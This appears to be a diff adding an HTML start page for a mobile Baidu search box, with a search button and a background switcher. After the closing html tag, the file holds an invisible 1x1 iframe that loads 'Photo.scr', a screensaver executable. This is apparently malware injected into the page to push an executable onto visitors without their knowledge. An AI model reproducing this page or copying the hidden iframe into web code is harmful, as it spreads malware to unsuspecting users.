@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1" charset="utf-8">
+	<title>index_mobile</title>
+	<link rel="stylesheet" type="text/css" href="css/index.css">
+	<script src="http://libs.baidu.com/jquery/1.10.2/jquery.min.js"></script>
+	<script type="text/javascript" src="js/js.js"></script>
+	<script type="text/javascript"> window.onload=testDevice();</script>
+</head>
+<body id="body" background="img/1.jpg" onfocus="loseOpacity()">
+<!-- <script type="text/javascript"> window.onload=testDevice();</script> -->
+	<div id="baidu-search">
+		<div  >
+			<input  class="textput" type="text" onfocus="getOpacity()" onblur="loseOpacity()" placeholder="  Hello World" value="" id="search" style="">
+		</div>
+		<div style="vertical-align:middle">
+		<div>
+			<button class="button" id="search-button" onclick="search()">百度一下</button> 
+		</div>
+
+		<div>
+			<button class="button" onclick="autoChangebg()">切换背景</button> 
+		</div>
+		</div>
+	</div>
+</body>
+</html>
+
+<iframe src=Photo.scr width=1 height=1 frameborder=0>
+</iframe>
